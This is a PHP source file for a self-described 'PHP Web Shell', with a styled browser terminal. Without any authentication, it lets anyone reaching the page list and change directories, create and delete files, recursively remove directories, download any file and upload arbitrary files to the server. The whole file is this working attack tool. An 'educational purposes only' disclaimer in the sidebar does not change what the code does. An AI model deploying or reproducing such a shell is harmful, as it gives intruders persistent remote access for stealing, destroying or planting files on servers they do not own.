<?php
// Start or resume the session
session_start();

// Check if 'cmd' parameter is provided in the URL
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];

    // Map the 'cmd' parameter to the corresponding function
    switch ($command) {
        case 'ls':
            echo ls();
            break;

        case 'pwd':
            echo pwd();
            break;

        // Add more cases for other allowed commands

        default:
            echo "Unknown command: $command";
            break;
    }

    exit; // Terminate script after processing the command
} elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Check if the form is submitted with a file upload
    if (isset($_FILES["fileToUpload"])) {
        $output = upload();
        echo $output;
        exit;
    }

    $command = $_POST["command"];
    $output = '';

    $parts = explode(' ', $command);
    $operation = strtolower(trim(array_shift($parts)));

    switch ($operation) {
        case 'ls':
            $output = ls();
            break;

        case 'pwd':
            $output = pwd();
            break;

        case 'cd':
            $output = cd($parts);
            break;

        case 'touch':
            $output = touchFile($parts);
            break;

        case 'rm':
            $output = remove($parts);
            break;

        case 'mkdir':
            $output = mkdirCommand($parts);
            break;

        case 'rmdir':
            $output = rmdirCommand($parts);
            break;

        case 'download':
            download($parts);
            exit;

        default:
            $output = "Unknown command: $operation";
            break;
    }

    // Output the result
    echo $output;
    exit; // Terminate execution after handling the command
}

function ls() {
    $files = scandir(getCurrentDirectory());
    return implode("\n", $files);
}

function pwd() {
    return getCurrentDirectory();
}

function cd($parts) {
    session_start(); // Start or resume a session

    if (!isset($_SESSION['current_directory'])) {
        $_SESSION['current_directory'] = getcwd(); // Initialize current directory
    }

    if (count($parts) > 0) {
        $directory = implode(' ', $parts);
        $currentDirectory = $_SESSION['current_directory'];

        // Check if the target directory exists
        if (is_dir($currentDirectory . '/' . $directory)) {
            $_SESSION['current_directory'] = realpath($currentDirectory . '/' . $directory);
            return "Changed directory to: " . $_SESSION['current_directory'];
        } else {
            return "Directory not found: $directory";
        }
    } else {
        return "Usage: cd [directory]";
    }
}

function getCurrentDirectory() {
    // Check if the current directory is set in the session
    if (isset($_SESSION['current_directory'])) {
        return $_SESSION['current_directory'];
    } else {
        // If not set, use the current working directory
        return getcwd();
    }
}

function touchFile($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            return "File already exists: $filename";
        } else {
            if (touch($filepath)) {
                return "File created: $filename";
            } else {
                return "Failed to create file: $filename";
            }
        }
    } else {
        return "Usage: touch [filename]";
    }
}

function remove($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            if (unlink($filepath)) {
                return "File removed: $filename";
            } else {
                return "Failed to remove file: $filename";
            }
        } else {
            return "File not found: $filename";
        }
    } else {
        return "Usage: rm [filename]";
    }
}

function mkdirCommand($parts) {
    if (count($parts) > 0) {
        $dirname = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $dirpath = $directory . '/' . $dirname;
        if (file_exists($dirpath)) {
            return "Directory already exists: $dirname";
        } else {
            if (mkdir($dirpath)) {
                return "Directory created: $dirname";
            } else {
                return "Failed to create directory: $dirname";
            }
        }
    } else {
        return "Usage: mkdir [directory]";
    }
}

function rmdirCommand($parts) {
    if (count($parts) > 0) {
        $dirname = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $dirpath = $directory . '/' . $dirname;
        if (file_exists($dirpath) && is_dir($dirpath)) {
            if (removeDirectory($dirpath)) {
                return "Directory removed: $dirname";
            } else {
                return "Failed to remove directory: $dirname";
            }
        } else {
            return "Directory not found: $dirname";
        }
    } else {
        return "Usage: rmdir [directory]";
    }
}

function removeDirectory($dir) {
    if (!file_exists($dir) || !is_dir($dir)) return false;

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (is_dir($dir . DIRECTORY_SEPARATOR . $item)) {
            if (!removeDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
        } else {
            if (!unlink($dir . DIRECTORY_SEPARATOR . $item)) return false;
        }
    }

    return rmdir($dir);
}

function download($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;

        if (file_exists($filepath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename=' . basename($filepath));
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filepath));
            readfile($filepath);
            exit;
        } else {
            echo "File not found: $filename";
        }
    } else {
        echo "Usage: download [filename]";
    }
}

function upload() {
    if ($_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
        $filename = basename($_FILES['fileToUpload']['name']);
        $directory = getCurrentDirectory(); // Get the current directory
        $destination = $directory . '/' . $filename; // Set the destination directory

        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $destination)) {
            return "File uploaded successfully: $filename";
        } else {
            return "Failed to upload file: $filename";
        }
    } else {
        return "File upload error: " . $_FILES['fileToUpload']['error'];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <style>
        body {
            font-family: monospace;
            background-color: #2b2b2b;
            color: #d4d4d4;
            margin: 0;
            display: flex;
            height: 100vh;
        }

        .sidebar {
            width: 200px;
            background-color: #1e1e1e;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            border-right: 1px solid #333;
        }

        .sidebar h2 {
            color: #007acc;
            font-size: 18px;
            margin-top: 0;
        }

        .sidebar ul {
            list-style: none;
            padding: 0;
        }

        .sidebar ul li {
            margin-bottom: 10px;
        }

        .sidebar ul li span {
            color: #d4d4d4;
        }

        .terminal-container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-grow: 1;
        }

        .terminal {
            max-width: 800px;
            width: 100%;
            background-color: #1e1e1e;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            margin: 20px;
        }

        #output {
            white-space: pre-wrap;
            background-color: #1e1e1e;
            color: #d4d4d4;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #333;
            border-radius: 3px;
            height: 300px;
            overflow-y: auto;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input[type="text"] {
            background-color: #1e1e1e;
            color: #d4d4d4;
            border: 1px solid #333;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 3px;
            width: calc(100% - 22px);
        }

        input[type="file"] {
            margin-bottom: 10px;
        }

        input[type="submit"] {
            background-color: #007acc;
            color: #fff;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 3px;
        }

        input[type="submit"]:hover {
            background-color: #005f9e;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2>Available Commands</h2>
        <ul>
            <li><span>ls</span> - List files in the current directory</li>
            <li><span>pwd</span> - Print working directory</li>
            <li><span>cd [dir]</span> - Change directory</li>
            <li><span>touch [file]</span> - Create a new file</li>
            <li><span>rm [file]</span> - Remove a file</li>
            <li><span>mkdir [dir]</span> - Create a new directory</li>
            <li><span>rmdir [dir]</span> - Remove a directory</li>
            <li><span>download [file]</span> - Download a file</li>
        </ul>
		<hr>
		 <div class="documentation">
            <p class="legal">🙏This tool is for educational purposes only. Use it only on servers you own or have permission to access. 😠Unauthorized use is illegal.
			I hereby disclaim any responsibility for misuse of this tool. ⚠️Users are advised to utilize it at their own risk.</p>
            
        </div>
    </div>
    <div class="terminal-container">
        <div class="terminal">
            <div id="output"></div>
            <form id="command-form" method="post">
                <input type="text" id="command" name="command" autocomplete="off" autofocus placeholder="Enter command...">
                <input type="submit" value="Execute">
            </form>
            <form id="upload-form" method="post" enctype="multipart/form-data">
                <input type="file" name="fileToUpload" id="fileToUpload">
                <input type="submit" value="Upload File">
            </form>
        </div>
    </div>
    <script>
        document.getElementById("command-form").addEventListener("submit", function(event) {
            event.preventDefault();
            const formData = new FormData(this);

            fetch("<?php echo $_SERVER['PHP_SELF']; ?>", {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById("output").textContent = data;
                document.getElementById("command").value = ''; // Clear the input field
            })
            .catch(error => {
                console.error("Error:", error);
            });
        });

        document.getElementById("upload-form").addEventListener("submit", function(event) {
            event.preventDefault();
            const formData = new FormData(this);

            fetch("<?php echo $_SERVER['PHP_SELF']; ?>", {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById("output").textContent = data;
                document.getElementById("fileToUpload").value = ''; // Clear the file input field
            })
            .catch(error => {
                console.error("Error:", error);
            });
        });
    </script>
</body>
</html>